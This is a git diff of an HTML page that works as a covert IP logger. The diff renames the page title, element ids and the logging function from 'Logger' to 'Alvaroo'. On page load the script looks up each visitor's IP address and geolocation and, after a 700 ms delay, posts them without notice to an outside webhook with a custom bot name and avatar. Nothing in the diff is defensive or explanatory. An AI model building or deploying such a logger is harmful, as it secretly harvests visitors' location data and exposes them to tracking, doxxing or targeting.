@@ -9,7 +9,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Logger/title>
+    <title>Alvaroo</title>
     <!-- CSS -->
     <link rel="stylesheet" href="src/css/main.min.css">
     <!-- Fontawesome -->
@@ -42,7 +42,7 @@
         get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (text) {
             var div = document.createElement("div");
             div.innerHTML = text;
-            div.id = "log";
+            div.id = "alvaroolog";
             const secondList = document.getElementsByClassName("header")[0]
             secondList.appendChild(div)
         });
@@ -54,21 +54,21 @@
             secondList.appendChild(div)
         });
 
-        function iplog() {
+        function ipLogByAlv() {
             var ispp = document.getElementById('ip').innerHTML
-            var extra = document.getElementById("log").innerHTML
+            var extra = document.getElementById("alvaroolog").innerHTML
             const request = new XMLHttpRequest();
             request.open("POST", wbhk);
             request.setRequestHeader('Content-type', 'application/json');
             const params = {
-                username: "Logger",
+                username: "Alvaroo",
                 avatar_url: 'https://i.pinimg.com/564x/03/5d/ba/035dba9b43fb40d2e48f260a2983bbac.jpg',
-                content: "**IP**:" + ispp + "_\n**Infos** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n"
+                content: "**Ip** : _" + ispp + "_\n**Infos** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n"
             }
             request.send(JSON.stringify(params));
         }
         setTimeout(function () {
-            iplog()
+            ipLogByAlv()
         }, 700);
     </script>
     <style>
